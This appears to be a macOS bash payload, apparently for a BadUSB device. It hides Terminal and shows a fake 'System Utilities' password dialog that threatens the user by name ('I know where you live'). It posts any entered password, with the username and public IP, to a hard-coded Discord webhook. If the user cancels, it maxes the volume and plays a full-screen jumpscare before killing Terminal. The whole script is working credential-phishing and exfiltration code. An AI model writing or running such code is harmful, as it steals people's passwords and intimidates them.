#!/bin/bash
# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON using awk/sed)
# ------------------------------------------------------------------------------
# - Displays a login prompt with two lines:
#     "I know where you live, [FirstName]."
#     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
# - If a non-empty password is entered, the script sends the data (password, public IP, username)
#   to a Discord webhook.
# - If the user presses Cancel (or closes the prompt), it triggers a jumpscare:
#     It creates a temporary HTML file that embeds your jumpscare video from GitHub,
#     sets system volume to maximum, opens it in the default browser in full screen,
#     and then forcefully kills Terminal.
#
# Requirements:
#   - macOS with osascript, curl, and standard Unix utilities.
#
# Usage:
#   chmod +x combined_script.sh
#   ./combined_script.sh

# --- Hide Terminal Immediately ---
osascript -e 'tell application "Terminal" to set visible of front window to false'

# --- Get Current Username ---
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# --- Initialize Capture Data ---
capture="username=${username}\n____________________________________________\n\n"

# --- Define AppleScript Login Prompt ---
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
set userPassword to ""
repeat
    try
        set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
        if userPassword is not "" then exit repeat
    on error errMsg number errNum
        if errNum is -128 then
            return "CANCEL"
        end if
    end try
end repeat
return userPassword
EOF

# --- Execute the Login Prompt and Capture Output ---
osascript -e "$applescriptCode" > /tmp/pass_temp.txt
password=$(cat /tmp/pass_temp.txt)
rm /tmp/pass_temp.txt

# --- Branch Based on User Input ---
if [ "$password" = "CANCEL" ]; then
    echo "User pressed Cancel. Triggering jumpscare..."
    
    # --- Define the Jumpscare Video URL (GitHub Raw Link) ---
    VIDEO_URL="https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
    HTML_FILE="/tmp/jumpscare.html"
    
    # --- Create a Temporary HTML File that Embeds the Video ---
    cat <<EOF > "$HTML_FILE"
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        background-color: black;
      }
      video {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay>
      <source src="$VIDEO_URL" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.addEventListener('loadeddata', function() {
        setTimeout(function(){
          if (video.requestFullscreen) {
            video.requestFullscreen();
          } else if (video.webkitRequestFullscreen) {
            video.webkitRequestFullscreen();
          } else if (video.msRequestFullscreen) {
            video.msRequestFullscreen();
          }
        }, 500);
      });
    </script>
  </body>
</html>
EOF

    # --- Set System Volume to Maximum ---
    osascript -e 'set volume output volume 100'
    
    # --- Open the Temporary HTML File in the Default Browser ---
    open "$HTML_FILE"
    osascript -e 'display notification "JumpScare video playing in full screen." with title "JumpScare"'
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
else
    # User provided a non-empty password – proceed to send data to Discord.
    echo "Password entered: $password"
    capture="${capture}password=${password}\n"
    
    # --- Retrieve Public IP Address ---
    ipaddress=$(curl -s https://api.ipify.org)
    capture="${capture}ipaddress=${ipaddress}"
    
    # --- Save Data to Temporary File ---
    echo -e "$capture" > /tmp/pass.txt
    
    # --- Manually Generate JSON Payload Without Python ---
    # Use awk to join all lines with literal \n (note the double escaping) and sed to escape double quotes.
    content=$(awk 'BEGIN{ORS="\\\\n"} {print}' /tmp/pass.txt | sed 's/"/\\"/g')
    payload=$(printf '{"content": "%s"}' "$content")
    
    # --- Debug: Log the payload for troubleshooting ---
    echo "Payload: $payload" > /tmp/discord_payload.log
    
    # --- Send Payload to Discord Webhook ---
    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
    curl -v -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK" >> /tmp/discord_payload.log 2>&1
    rm /tmp/pass.txt
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
fi
